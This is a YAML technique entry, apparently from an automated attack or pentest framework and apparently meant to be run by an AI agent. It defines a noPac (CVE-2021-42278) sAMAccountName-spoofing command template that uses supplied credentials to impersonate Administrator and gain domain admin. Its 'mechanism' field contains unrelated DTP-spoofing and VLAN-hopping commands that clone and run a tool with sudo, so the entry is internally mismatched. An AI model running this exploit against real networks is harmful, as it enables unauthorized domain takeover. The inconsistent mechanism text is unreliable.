name: samaccountname_spoof
category: ad
description: sAMAccountName spoofing (noPac/CVE-2021-42278)
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 noPac.py '{domain}/{username}:{password}' -dc-ip {target_ip} --impersonate Administrator -use-ldap
parser: impacket_parser
expected_effects:
- nopac_exploited
- domain_admin
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "git clone https://github.com/fleetcaptain/dtp-spoof.git sudo python3 dtp-spoof/dtp-spoof.py -i eth0 --desirable\
  \ Recon helper (passively fingerprint the port\u2019s DTP state): sudo modprobe 8021q sudo ip link add link eth0 name eth0.30\
  \ type vlan id 30"
hacktricks_ref: generic-methodologies-and-resources/pentesting-network/lateral-vlan-segmentation-bypass.md
references:
  ocd_mindmap_node_ids:
  - 1e2e7a1f5d
  - 2a67406b9e
  - 4324dad5d1
  - 630250d040
  - b54a6b44d8
